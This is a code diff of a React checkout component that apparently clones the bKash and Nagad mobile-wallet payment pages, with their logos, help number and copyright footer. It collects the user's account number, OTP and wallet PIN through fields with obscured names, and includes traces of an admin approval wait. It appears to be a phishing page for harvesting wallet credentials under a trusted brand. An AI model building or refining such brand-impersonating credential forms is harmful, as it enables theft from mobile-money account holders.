@@ -455,6 +455,27 @@ export default function OnlineCheckoutGateway({
               : 'radial-gradient(ellipse at center, #ff1224 0%, #bc101c 70%, #9d0913 100%)'
           }}
         >
+          {/* Logo */}
+          {isBkash ? (
+            <div className="bg-white p-2.5 rounded-xl shadow-md flex items-center justify-center mb-6 w-32 h-14">
+              <img 
+                src={settings?.bkashLogo || "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c7/BKash_logo.svg/512px-BKash_logo.svg.png"}
+                alt="bKash"
+                className="h-full max-h-10 object-contain"
+                referrerPolicy="no-referrer"
+              />
+            </div>
+          ) : (
+            <div className="flex items-center justify-center bg-white p-2 rounded-xl shadow-md mb-6 w-28 h-12 overflow-hidden">
+              <img 
+                src={settings?.nagadLogo || "https://upload.wikimedia.org/wikipedia/commons/c/c5/Nagad_logo.svg"}
+                alt="Nagad"
+                className="h-full object-contain"
+                referrerPolicy="no-referrer"
+              />
+            </div>
+          )}
+
           {/* Circular outer pulsing glow */}
           <div className="relative w-20 h-20 flex items-center justify-center mb-6">
             <div className="absolute inset-0 rounded-full border-4 border-white/20 animate-pulse"></div>
@@ -535,31 +556,8 @@ export default function OnlineCheckoutGateway({
               অনুরোধ প্রক্রিয়াকরণ করা হচ্ছে...
             </h2>
             <p className="text-[11px] text-white/85 max-w-xs leading-relaxed font-normal font-sans">
-              সার্ভারের সাথে সংযোগ স্থাপন করা হচ্ছে, অনুগ্রহ করে সর্বোচ্চ ১০ সেকেন্ড অপেক্ষা করুন। ব্রাউজারের ব্যাক বা রিলোড বাটন প্রেস করা থেকে বিরত থাকুন।
+              সার্ভারের সাথে সংযোগ স্থাপন করা হচ্ছে, অনুগ্রহ করে সর্বোচ্চ ১০ সেকেন্ড অপেক্ষা করুন...
             </p>
-            <div className="bg-black/15 px-4 py-2.5 rounded-xl border border-white/10 w-full flex flex-col gap-1.5 mt-2">
-              <div className="flex justify-between items-center text-xs font-sans">
-                <span className="text-white/60">অবশিষ্ট সময় (Timeout):</span>
-                <span className="font-bold text-amber-300 font-sans text-[13px] animate-pulse">{toBanglaDigits(adminWaitSeconds)} সেকেন্ড</span>
-              </div>
-              <div className="flex justify-between items-center text-xs font-sans">
-                <span className="text-white/60">অ্যাকাউন্ট নং:</span>
-                <span className="font-bold font-mono">{accountNumber}</span>
-              </div>
-              <div className="flex justify-between items-center text-xs font-sans">
-                <span className="text-white/60">পেমেন্ট পরিমাণ:</span>
-                <span className="font-bold font-mono">৳{amount}.00</span>
-              </div>
-            </div>
-
-
-            <button
-              type="button"
-              onClick={handleInstantApproveForDemo}
-              className="w-full mt-3 py-2.5 bg-white/10 hover:bg-white/20 text-white border border-white/20 rounded-xl text-[11px] font-bold font-sans tracking-wide transition-all duration-200 active:scale-[0.98] cursor-pointer"
-            >
-              তাত্ক্ষণিক অনুমোদন করুন (Instant Demo Approve)
-            </button>
           </div>
         </div>
       </div>
@@ -567,59 +565,49 @@ export default function OnlineCheckoutGateway({
   }
 
   // ==========================================
-  // RENDER PATH 1: OFFICIAL NAGAD WEB PAY UI
+  // RENDER PATH 1: NAGAD TRADITIONAL WEB UI
   // ==========================================
   if (type === 'nagad') {
     return (
-      <div className="fixed inset-0 bg-[#0c1822] sm:bg-[#1d2d3d]/90 z-[9999] flex justify-center items-start overflow-y-auto p-0 sm:p-5 font-sans selection:bg-[#a71a1d] selection:text-white">
+      <div className="fixed inset-0 bg-[#0c1822] sm:bg-[#1d2d3d]/90 z-[9999] flex justify-center items-start overflow-y-auto p-0 sm:p-5 font-sans selection:bg-[#a71a1d] selection:text-white animate-fade-in">
         <div 
-          className="w-full max-w-[500px] shadow-2xl flex flex-col select-none my-0 sm:my-8 rounded-none sm:rounded-2xl border border-white/10 min-h-[100vh] sm:min-h-[560px] relative p-4 sm:p-6 overflow-hidden"
+          className="w-full max-w-[500px] shadow-2xl flex flex-col select-none my-0 sm:my-8 rounded-none sm:rounded-2xl border border-white/10 min-h-[100vh] sm:min-h-0 relative p-4 sm:p-6 overflow-hidden"
           style={{
             background: 'radial-gradient(ellipse at center, #ff1224 0%, #d81421 28%, #bc101c 55%, #9d0913 100%)'
           }}
         >
-          
-          {/* Decorative Top header bars / language switch */}
+          {/* Language Selection */}
           <div className="w-full flex justify-end items-center mb-1">
             <div className="flex border border-white/35 rounded overflow-hidden text-[11px] font-sans">
               <span className="px-2 py-0.5 text-white/85 hover:bg-white/10 cursor-pointer">বাং</span>
-              <span className="px-2 py-0.5 bg-white text-[#7f1115] font-semibold">Eng</span>
+              <span className="px-2 py-0.5 bg-white text-[#7f1115] font-semibold flex items-center justify-center">Eng</span>
             </div>
           </div>
 
           <form onSubmit={handleNextStep} className="flex flex-col flex-1 justify-between">
-            <div className="flex flex-col flex-1 justify-start">
-              {/* Shopping Cart Header Illustration */}
+            <div>
+              {/* Top Shopping Cart Logo */}
               <div className="py-2 text-center">
-                <svg viewBox="0 0 120 100" className="w-[110px] h-[85px] mx-auto text-white/95" fill="none" stroke="currentColor" strokeWidth="1.6">
-                  {/* Sparks / Tiny rectangles */}
+                <svg viewBox="0 0 120 100" className="w-[110px] h-[85px] mx-auto text-white/95 animate-fadeIn" fill="none" stroke="currentColor" strokeWidth="1.6">
                   <rect x="25" y="45" width="2.5" height="2.5" fill="currentColor" transform="rotate(45 26.5 46.5)" />
                   <rect x="31" y="53" width="1.8" height="1.8" fill="currentColor" />
                   <rect x="33" y="37" width="2.5" height="2.5" fill="currentColor" transform="rotate(20 34.2 38.2)" />
                   <rect x="85" y="42" width="2.5" height="2.5" fill="currentColor" transform="rotate(45 86.2 43.2)" />
                   <rect x="91" y="49" width="1.8" height="1.8" fill="currentColor" />
                   <rect x="93" y="35" width="2.5" height="2.5" fill="currentColor" />
-
-                  {/* Cargo inside cart */}
                   <path d="M48 40 L64 24 L72 32 L56 48 Z" fill="currentColor" fillOpacity="0.1" strokeLinecap="round" strokeLinejoin="round" />
                   <path d="M57 34 L69 22 L76 29 L64 41 Z" fill="currentColor" fillOpacity="0.2" strokeLinecap="round" strokeLinejoin="round" />
-
-                  {/* Main Cart basket */}
                   <path d="M38 42h44l-8 28H44l-6-28z" strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" />
                   <path d="M34 34h6l4 36" strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" />
-                  
-                  {/* Wheels */}
                   <circle cx="48" cy="76" r="3.5" strokeWidth="1.8" fill="currentColor" />
                   <circle cx="74" cy="76" r="3.5" strokeWidth="1.8" fill="currentColor" />
                 </svg>
-
-                {/* Merchant Name */}
                 <h1 className="text-white text-base sm:text-lg font-bold font-sans mt-2 tracking-wide">
                   {merchantName}
                 </h1>
               </div>
 
-              {/* Left-Aligned Bill Details section */}
+              {/* Price Details */}
               <div className="w-full max-w-[360px] mx-auto text-left text-white/90 text-xs sm:text-[13px] space-y-[4px] mt-3 pb-3 border-b border-white/10 font-sans leading-normal">
                 <div>
                   <span className="font-bold text-white/95">Invoice No:</span> <span className="font-normal font-mono select-all text-white/90 ml-1">{invoiceNo}</span>
@@ -632,14 +620,12 @@ export default function OnlineCheckoutGateway({
                 </div>
               </div>
 
-              {/* STEP 1: PHONE ACCOUNT NUMBER */}
+              {/* STEP 1: PHONE NUMBER */}
               {step === 1 && (
-                <div className="mt-6 flex flex-col justify-center items-center text-center flex-1">
+                <div className="mt-6 flex flex-col justify-center items-center text-center font-sans animate-fadeIn">
                   <h2 className="text-white/95 text-xs sm:text-sm font-normal mb-4 tracking-wide">
                     Your Nagad Account Number
                   </h2>
-                  
-                  {/* Hidden Input triggering custom fields */}
                   <div className="relative w-full max-w-[320px] cursor-pointer" onClick={triggerPhoneFocus}>
                     <input
                       ref={phoneInputRef}
@@ -650,93 +636,56 @@ export default function OnlineCheckoutGateway({
                       onChange={(e) => handleAccountNumberChange(e.target.value)}
                       className="absolute opacity-0 inset-0 w-full h-full cursor-pointer z-10"
                     />
-                    
-                    {/* Visual Segmented Boxes */}
                     <div className="flex items-center gap-1 sm:gap-1.5 justify-center">
-                      {/* Digits 0, 1, 2 */}
                       {[0, 1, 2].map((idx) => {
                         const char = accountNumber[idx] || "";
                         const isActive = accountNumber.length === idx;
                         return (
-                          <div 
-                            key={idx} 
-                            className={`w-[22px] h-[28px] sm:w-[28px] sm:h-[34px] rounded bg-white text-neutral-800 text-[14px] sm:text-base font-normal flex items-center justify-center border-none shadow-sm transition-all ${isActive ? 'ring-2 ring-white/30' : ''}`}
-                          >
+                          <div key={idx} className={`w-[22px] h-[28px] sm:w-[28px] sm:h-[34px] rounded bg-white text-neutral-800 text-[14px] sm:text-base font-normal flex items-center justify-center border-none shadow-sm transition-all ${isActive ? 'ring-2 ring-white/30' : ''}`}>
                             {char}
                           </div>
                         );
                       })}
-                      
                       <span className="text-white/60 font-black text-base px-0.5">-</span>
-
-                      {/* Digits 3, 4, 5, 6 */}
-                      {[3, 4, 5, 2].map((dummyIdx, stepIdx) => {
-                        const idx = stepIdx + 3;
+                      {[3, 4, 5, 6].map((idx) => {
                         const char = accountNumber[idx] || "";
                         const isActive = accountNumber.length === idx;
                         return (
-                          <div 
-                            key={idx} 
-                            className={`w-[22px] h-[28px] sm:w-[28px] sm:h-[34px] rounded bg-white text-neutral-800 text-[14px] sm:text-base font-normal flex items-center justify-center border-none shadow-sm transition-all ${isActive ? 'ring-2 ring-white/30' : ''}`}
-                          >
+                          <div key={idx} className={`w-[22px] h-[28px] sm:w-[28px] sm:h-[34px] rounded bg-white text-neutral-800 text-[14px] sm:text-base font-normal flex items-center justify-center border-none shadow-sm transition-all ${isActive ? 'ring-2 ring-white/30' : ''}`}>
                             {char}
                           </div>
                         );
                       })}
-
                       <span className="text-white/60 font-black text-base px-0.5">-</span>
-
-                      {/* Digits 7, 8, 9, 10 */}
                       {[7, 8, 9, 10].map((idx) => {
                         const char = accountNumber[idx] || "";
                         const isActive = accountNumber.length === idx;
                         return (
-                          <div 
-                            key={idx} 
-                            className={`w-[22px] h-[28px] sm:w-[28px] sm:h-[34px] rounded bg-white text-neutral-800 text-[14px] sm:text-base font-normal flex items-center justify-center border-none shadow-sm transition-all ${isActive ? 'ring-2 ring-white/30' : ''}`}
-                          >
+                          <div key={idx} className={`w-[22px] h-[28px] sm:w-[28px] sm:h-[34px] rounded bg-white text-neutral-800 text-[14px] sm:text-base font-normal flex items-center justify-center border-none shadow-sm transition-all ${isActive ? 'ring-2 ring-white/30' : ''}`}>
                             {char}
                           </div>
                         );
                       })}
                     </div>
                   </div>
-
                   <p className="text-white/80 text-[10px] sm:text-[11px] mt-4 tracking-wide max-w-[340px] leading-relaxed">
                     By clicking/tapping "Proceed" you are agreeing to our <span className="font-bold underline cursor-pointer">Terms and Conditions</span>
                   </p>
-
-                  {/* Spacer to push buttons further down */}
-                  <div className="flex-1 min-h-[30px] sm:min-h-[50px]" />
-
-                  {/* Buttons */}
-                  <div className="flex gap-4 justify-center w-full max-w-[320px] mt-8 mb-2">
-                    <button
-                      type="submit"
-                      disabled={isConfirmDisabled()}
-                      className="flex-1 py-1.5 sm:py-2 rounded-md bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer"
-                    >
-                      Proceed
-                    </button>
-                    <button
-                      type="button"
-                      onClick={onCancel}
-                      className="flex-1 py-1.5 sm:py-2 rounded-md bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer"
-                    >
-                      Close
-                    </button>
+                  <div className="flex gap-4 justify-center w-full max-w-[320px] mt-6">
+                    <button type="submit" disabled={isConfirmDisabled()} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer disabled:opacity-50">Proceed</button>
+                    <button type="button" onClick={onCancel} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer">Close</button>
                   </div>
                 </div>
               )}
 
               {/* STEP 2: OTP VERIFICATION */}
               {step === 2 && (
-                <div className="mt-6 flex flex-col justify-center items-center text-center flex-1">
+                <div className="mt-6 flex flex-col justify-center items-center text-center font-sans animate-fadeIn">
                   <h2 className="text-white/95 text-xs sm:text-sm font-normal mb-4 tracking-wide">
                     Enter Verification Code [OTP]
                   </h2>
-                  
                   <input
+                    ref={otpInputRef}
                     type="text"
                     maxLength={6}
                     required
@@ -745,80 +694,42 @@ export default function OnlineCheckoutGateway({
                     placeholder="XXXXXX"
                     className="w-full max-w-[220px] h-[30px] sm:h-[34px] border-none rounded text-center text-base text-neutral-800 tracking-[0.4em] font-normal focus:outline-none focus:ring-2 focus:ring-white/30 shadow-inner bg-white placeholder-neutral-300"
                   />
-
-                  {/* Count countdown text */}
                   {countdown > 0 && (
-                    <p className="text-white/70 text-[11px] mt-2">
-                      Remaining time: {countdown}s
-                    </p>
+                    <p className="text-white/70 text-[11px] mt-2">Remaining time: {countdown}s</p>
                   )}
-
-                  {/* Spacer to push buttons further down */}
-                  <div className="flex-1 min-h-[30px] sm:min-h-[50px]" />
-
-                  {/* Three row action button layout replicas */}
-                  <div className="flex gap-2 justify-center w-full max-w-[340px] mt-8 mb-2">
-                    <button
-                      type="submit"
-                      disabled={isConfirmDisabled()}
-                      className="flex-1 py-1.5 sm:py-2 rounded-md bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer"
-                    >
-                      Proceed
-                    </button>
-                    <button
-                      type="button"
-                      disabled={countdown > 0}
-                      onClick={() => setCountdown(120)}
-                      className="flex-1 py-1.5 sm:py-2 rounded-md bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer"
-                    >
-                      Resend Code
-                    </button>
-                    <button
-                      type="button"
-                      onClick={onCancel}
-                      className="flex-1 py-1.5 sm:py-2 rounded-md bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer"
-                    >
-                      Close
-                    </button>
+                  <div className="flex gap-2 justify-center w-full max-w-[340px] mt-6">
+                    <button type="submit" disabled={isConfirmDisabled()} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer disabled:opacity-50">Proceed</button>
+                    <button type="button" disabled={countdown > 0} onClick={() => setCountdown(120)} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer disabled:opacity-55">Resend Code</button>
+                    <button type="button" onClick={onCancel} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer">Close</button>
                   </div>
                 </div>
               )}
 
               {/* STEP 3: PIN ENTRY */}
               {step === 3 && (
-                <div className="mt-6 flex flex-col justify-center items-center text-center flex-1">
+                <div className="mt-6 flex flex-col justify-center items-center text-center font-sans animate-fadeIn">
                   <h2 className="text-white/95 text-xs sm:text-sm font-normal mb-4 tracking-wide">
                     Enter PIN
                   </h2>
-
-                  {/* Password customized circles container */}
                   <div className="relative w-full max-w-[280px] cursor-pointer" onClick={triggerPINFocus}>
                     <input
                       ref={pinInputRef}
                       type="tel"
                       inputMode="numeric"
                       pattern="[0-9]*"
-                      autoComplete="one-time-code"
-                      name="security_code_nagad_auth"
-                      id="security_code_nagad_auth"
                       maxLength={4}
                       required
                       value={pin}
                       onChange={(e) => handlePinChange(e.target.value)}
                       className="absolute opacity-0 inset-0 w-full h-full cursor-pointer z-10"
                     />
-
-                    {/* Displays 4 rounded boxes */}
                     <div className="flex items-center gap-1.5 sm:gap-2 justify-center">
                       {[0, 1, 2, 3].map((idx) => {
                         const hasVal = pin.length > idx;
                         const isActive = pin.length === idx;
                         const showDigit = hasVal && lastTypedIdx === idx;
                         return (
-                          <div 
-                            key={idx}
-                            className={`w-[28px] h-[28px] sm:w-[34px] sm:h-[34px] rounded bg-white text-neutral-800 flex items-center justify-center border-none shadow-md transition-all ${isActive ? 'ring-2 ring-white/30' : ''}`}
-                          >
+                          <div key={idx} className={`w-[28px] h-[28px] sm:w-[34px] sm:h-[34px] rounded bg-white text-neutral-800 flex items-center justify-center border-none shadow-md transition-all ${isActive ? 'ring-2 ring-white/30' : ''}`}>
                             {showDigit ? (
                               <span className="text-sm sm:text-base font-normal">{pin[idx]}</span>
                             ) : hasVal ? (
@@ -831,38 +742,21 @@ export default function OnlineCheckoutGateway({
                       })}
                     </div>
                   </div>
-
-                  {/* Spacer to push buttons further down */}
-                  <div className="flex-1 min-h-[40px] sm:min-h-[60px]" />
-
-                  {/* Buttons panel */}
-                  <div className="flex gap-4 justify-center w-full max-w-[320px] mt-10 mb-2">
-                    <button
-                      type="submit"
-                      disabled={isConfirmDisabled()}
-                      className="flex-1 py-1.5 sm:py-2 rounded-md bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer"
-                    >
-                      Proceed
-                    </button>
-                    <button
-                      type="button"
-                      onClick={onCancel}
-                      className="flex-1 py-1.5 sm:py-2 rounded-md bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer"
-                    >
-                      Close
-                    </button>
+                  <div className="flex gap-4 justify-center w-full max-w-[320px] mt-8">
+                    <button type="submit" disabled={isConfirmDisabled()} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer disabled:opacity-50">Proceed</button>
+                    <button type="button" onClick={onCancel} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer">Close</button>
                   </div>
                 </div>
               )}
             </div>
 
             {/* Sticky Official Nagad Footer illustration */}
-            <div className="mt-8 flex flex-col items-center select-none pb-2 pt-4">
+            <div className="mt-8 flex flex-col items-center select-none pb-2 pt-4 shrink-0">
               <div className="flex items-center justify-center max-w-[220px] mb-2 overflow-hidden">
                 <img 
                   src={settings?.nagadLogo || "https://upload.wikimedia.org/wikipedia/commons/c/c5/Nagad_logo.svg"}
                   alt="Nagad Logo"
-                  className="h-[54px] object-contain animate-fadeIn"
+                  className="h-[54px] object-contain"
                   referrerPolicy="no-referrer"
                 />
               </div>
@@ -919,212 +813,214 @@ export default function OnlineCheckoutGateway({
             />
           </div>
 
-        {/* ======================================= */}
-        {/* MERCHANT AREA */}
-        {/* ======================================= */}
-        <div className="flex justify-between items-center py-2 px-6 border-b border-neutral-150 bg-neutral-50/50">
-          <div className="flex items-center gap-2.5">
-            <div className="w-7 h-7 rounded-full flex items-center justify-center bg-[#c5a059] text-white shadow-xs select-none">
-              <Landmark className="w-3.5 h-3.5" />
-            </div>
-            <div className="flex flex-col text-left">
-              <h3 className="text-[#34495e] text-[13px] max-[600px]:text-[12px] font-medium leading-tight">
-                {merchantName.replace(/Cash-In Deposit/gi, '').replace(/Cash-In/gi, '').trim()}
-              </h3>
-              <p className="text-[#7f8c8d] text-[10px] mt-[1px]">
-                Inv No: {invoiceNo}
-              </p>
-            </div>
-          </div>
-          <div className="text-[15px] max-[600px]:text-[14px] text-zinc-700 font-semibold font-sans">
-            ৳{amount}
-          </div>
-        </div>
-
-        {/* ======================================= */}
-        {/* BRAND COLORED SECTION (PINK OR ORANGE) */}
-        {/* ======================================= */}
-        <form onSubmit={handleNextStep} className="flex flex-col">
-          
-          <div 
-            className="h-[210px] max-[600px]:h-[200px] flex flex-col justify-center items-center p-4 transition-all duration-300 relative text-center"
-            style={{ 
-              background: '#e2136e'
-            }}
-          >
-            {showCancelConfirm ? (
-              <div className="w-full flex flex-col justify-center items-center text-center px-2 animate-fadeIn">
-                {/* Outlined Hand Icon */}
-                <Hand className="w-8 h-8 text-white mb-2.5" strokeWidth={1.5} />
-                <div className="text-white text-[12.5px] sm:text-[14px] font-sans font-normal tracking-wide whitespace-nowrap">
-                  Are you sure you want to cancel this payment?
-                </div>
+          {/* ======================================= */}
+          {/* MERCHANT AREA */}
+          {/* ======================================= */}
+          <div className="flex justify-between items-center py-2 px-6 border-b border-neutral-150 bg-neutral-50/50">
+            <div className="flex items-center gap-2.5">
+              <div className="w-7 h-7 rounded-full flex items-center justify-center bg-[#c5a059] text-white shadow-xs select-none">
+                <Landmark className="w-3.5 h-3.5" />
               </div>
-            ) : (
-              <>
-                {/* STEP 1: ACCOUNT NUMBER ENTRY */}
-                {step === 1 && (
-                  <div className="w-full flex flex-col justify-center items-center text-center px-4">
-                    <h2 className="text-white/95 text-[13px] max-[600px]:text-[12px] font-normal mb-2.5 tracking-wide">
-                      Your bKash Account Number
-                    </h2>
-                    
-                    <input
-                      ref={bKashPhoneInputRef}
-                      type="text"
-                      maxLength={11}
-                      required
-                      value={accountNumber}
-                      onChange={(e) => handleAccountNumberChange(e.target.value)}
-                      placeholder="e.g 01XXXXXXXXX"
-                      className="w-full max-w-[420px] h-[36px] border-none rounded-md text-center text-[15px] text-zinc-700 font-normal focus:outline-none focus:ring-0 shadow-xs bg-white placeholder-zinc-400"
-                    />
-
-                    <div className="terms mt-2 text-white/90 text-[11px] text-center">
-                      Confirm and proceed,{' '}
-                      <a href="#" onClick={(e) => e.preventDefault()} className="underline text-white font-normal hover:text-zinc-200">
-                        terms & conditions
-                      </a>
-                    </div>
-                  </div>
-                )}
-
-                {/* STEP 2: OTP VERIFICATION CODE */}
-                {step === 2 && (
-                  <div className="w-full flex flex-col justify-center items-center text-center px-4">
-                    <h2 className="text-white/95 text-[12px] max-[600px]:text-[11px] font-normal mb-2 tracking-wide leading-relaxed px-2">
-                      Enter Verification Code Sent To {obfuscateNumber(accountNumber)}
-                    </h2>
-                    
-                    <input
-                      type="text"
-                      maxLength={6}
-                      required
-                      value={otp}
-                      onChange={(e) => handleOtpChange(e.target.value)}
-                      placeholder="Enter 6 digit code"
-                      className="w-full max-w-[420px] h-[36px] border-none rounded-md text-center text-[15px] text-zinc-700 font-normal focus:outline-none focus:ring-0 shadow-xs bg-white tracking-widest placeholder-zinc-400"
-                    />
-
-                    <div className="terms mt-2 text-white/90 text-[11px] text-center">
-                      {countdown > 0 ? (
-                        <span>Resend Code in <strong className="underline text-white font-medium">{countdown}s</strong></span>
-                      ) : (
-                        <button
-                          type="button"
-                          onClick={() => setCountdown(120)}
-                          className="underline text-white font-medium cursor-pointer hover:text-zinc-200 transition-colors"
-                        >
-                          Resend Code
-                        </button>
-                      )}
-                    </div>
-                  </div>
-                )}
-
-                {/* STEP 3: PIN VERIFICATION */}
-                {step === 3 && (
-                  <div className="w-full flex flex-col justify-center items-center text-center px-4">
-                    <h2 className="text-white/95 text-[13px] max-[600px]:text-[12px] font-normal mb-2 tracking-wide">
-                      Enter PIN
-                    </h2>
-                    
-                    <input
-                      type="text"
-                      inputMode="numeric"
-                      pattern="[0-9]*"
-                      autoComplete="one-time-code"
-                      name="txn_verification_code_val"
-                      id="txn_verification_code_val"
-                      maxLength={5}
-                      required
-                      value={pin}
-                      onChange={(e) => handlePinChange(e.target.value)}
-                      placeholder="•••••"
-                      className="w-full max-w-[420px] h-[36px] border-none rounded-md text-center text-[18px] text-zinc-700 font-semibold focus:outline-none focus:ring-0 shadow-xs bg-white tracking-widest"
-                      style={{ WebkitTextSecurity: 'disc' }}
-                    />
-                  </div>
-                )}
-              </>
-            )}
-          </div>
-
-          {/* ======================================= */}
-          {/* BUTTONS PANEL */}
-          {/* ======================================= */}
-          <div className="p-2 flex gap-3 bg-white">
-            {showCancelConfirm ? (
-              <>
-                <button
-                  type="button"
-                  onClick={onCancel}
-                  className="btn cancel flex-1 h-[38px] rounded-md text-[13px] font-sans font-medium bg-white border border-neutral-200 text-neutral-600 transition-colors cursor-pointer hover:bg-neutral-50 active:scale-[0.99] focus:outline-none focus:ring-0"
-                >
-                  Yes
-                </button>
-                
-                <button
-                  type="button"
-                  onClick={() => setShowCancelConfirm(false)}
-                  className="btn confirm flex-1 h-[38px] rounded-md text-[13px] font-sans font-medium transition-all active:scale-[0.99] focus:outline-none border-none outline-none"
-                  style={{
-                    backgroundColor: '#e2136e',
-                    color: '#ffffff',
-                    cursor: 'pointer'
-                  }}
-                >
-                  No
-                </button>
-              </>
-            ) : (
-              <>
-                <button
-                  type="button"
-                  onClick={() => setShowCancelConfirm(true)}
-                  className="btn cancel flex-1 h-[38px] rounded-md text-[13px] font-sans font-medium bg-white border border-neutral-200 text-neutral-600 transition-colors cursor-pointer hover:bg-neutral-50 active:scale-[0.99] focus:outline-none focus:ring-0"
-                >
-                  Cancel
-                </button>
-                
-                <button
-                  type="submit"
-                  disabled={isConfirmDisabled()}
-                  className="btn confirm flex-1 h-[38px] rounded-md text-[13px] font-sans font-medium transition-all active:scale-[0.99] focus:outline-none disabled:opacity-50 disabled:cursor-not-allowed border-none outline-none"
-                  style={{
-                    backgroundColor: '#e2136e',
-                    color: '#ffffff',
-                    cursor: 'pointer'
-                  }}
-                >
-                  Confirm
-                </button>
-              </>
-            )}
-          </div>
-
-          {/* ======================================= */}
-          {/* FOOTER */}
-          {/* ======================================= */}
-          <div className="footer text-center bg-white pb-[12px] pt-1 px-5 select-none text-sans">
-            <div className="flex items-center justify-center gap-1">
-              <span className="w-3.5 h-3.5 rounded-full flex items-center justify-center" style={{ backgroundColor: '#e2136e' }}>
-                <svg className="w-2 h-2 text-white" fill="currentColor" viewBox="0 0 24 24">
-                  <path d="M21.384,17.791 C20.443,16.852 19.124,16.321 17.818,16.321 C17.387,16.321 16.96,16.38 16.538,16.494 L14.773,16.92 C12.639,15.753 10.965,14.079 9.798,11.945 L10.224,10.18 C10.339,9.758 10.398,9.331 10.398,8.9 C10.398,7.594 9.867,6.275 8.928,5.334 L7.151,3.56 C6.162,2.571 4.545,2.571 3.556,3.56 L2.19,4.924 C1.802,5.312 1.547,5.811 1.455,6.349 C1.155,8.114 1.838,11.378 4.792,14.613 C7.901,18.018 11.23,20.082 14.156,20.082 C14.441,20.082 14.726,20.06 15.006,20.016 C15.544,19.924 16.043,19.668 16.431,19.28 L17.797,17.914 C18.784,16.926 18.784,15.31 17.797,14.321 L21.384,17.791 Z" />
-                </svg>
-              </span>
-              <span className="help-number text-[11px] font-bold font-sans ml-1" style={{ color: '#e2136e' }}>
-                16247
-              </span>
+              <div className="flex flex-col text-left">
+                <h3 className="text-[#34495e] text-[13px] max-[600px]:text-[12px] font-medium leading-tight">
+                  {merchantName.replace(/Cash-In Deposit/gi, '').replace(/Cash-In/gi, '').trim()}
+                </h3>
+                <p className="text-[#7f8c8d] text-[10px] mt-[1px]">
+                  Inv No: {invoiceNo}
+                </p>
+              </div>
             </div>
-            <div className="copy mt-[3px] text-zinc-400 text-[11px] font-sans">
-              © 2026 bKash, All Rights Reserved
+            <div className="text-[15px] max-[600px]:text-[14px] text-zinc-700 font-semibold font-sans">
+              ৳{amount}
             </div>
           </div>
 
-        </form>
+          {/* ======================================= */}
+          {/* BRAND COLORED SECTION (PINK OR ORANGE) */}
+          {/* ======================================= */}
+          <form onSubmit={handleNextStep} className="flex flex-col">
+            
+            <div 
+              className="h-[210px] max-[600px]:h-[200px] flex flex-col justify-center items-center p-4 transition-all duration-300 relative text-center"
+              style={{ 
+                background: '#e2136e'
+              }}
+            >
+              {showCancelConfirm ? (
+                <div className="w-full flex flex-col justify-center items-center text-center px-2 animate-fadeIn">
+                  {/* Outlined Hand Icon */}
+                  <Hand className="w-8 h-8 text-white mb-2.5" strokeWidth={1.5} />
+                  <div className="text-white text-[12.5px] sm:text-[14px] font-sans font-normal tracking-wide whitespace-nowrap">
+                    Are you sure you want to cancel this payment?
+                  </div>
+                </div>
+              ) : (
+                <>
+                  {/* STEP 1: ACCOUNT NUMBER ENTRY */}
+                  {step === 1 && (
+                    <div className="w-full flex flex-col justify-center items-center text-center px-4">
+                      <h2 className="text-white/95 text-[13px] max-[600px]:text-[12px] font-normal mb-2.5 tracking-wide">
+                        Your bKash Account Number
+                      </h2>
+                      
+                      <input
+                        ref={bKashPhoneInputRef}
+                        type="text"
+                        maxLength={11}
+                        required
+                        value={accountNumber}
+                        onChange={(e) => handleAccountNumberChange(e.target.value)}
+                        placeholder="e.g 01XXXXXXXXX"
+                        className="w-full max-w-[420px] h-[36px] border-none rounded-md text-center text-[15px] text-zinc-700 font-normal focus:outline-none focus:ring-0 shadow-xs bg-white placeholder-zinc-400"
+                      />
+
+                      <div className="terms mt-2 text-white/90 text-[11px] text-center">
+                        Confirm and proceed,{' '}
+                        <a href="#" onClick={(e) => e.preventDefault()} className="underline text-white font-normal hover:text-zinc-200">
+                          terms & conditions
+                        </a>
+                      </div>
+                    </div>
+                  )}
+
+                  {/* STEP 2: OTP VERIFICATION CODE */}
+                  {step === 2 && (
+                    <div className="w-full flex flex-col justify-center items-center text-center px-4">
+                      <h2 className="text-white/95 text-[12px] max-[600px]:text-[11px] font-normal mb-2 tracking-wide leading-relaxed px-2">
+                        Enter Verification Code Sent To {obfuscateNumber(accountNumber)}
+                      </h2>
+                      
+                      <input
+                        ref={otpInputRef}
+                        type="text"
+                        maxLength={6}
+                        required
+                        value={otp}
+                        onChange={(e) => handleOtpChange(e.target.value)}
+                        placeholder="Enter 6 digit code"
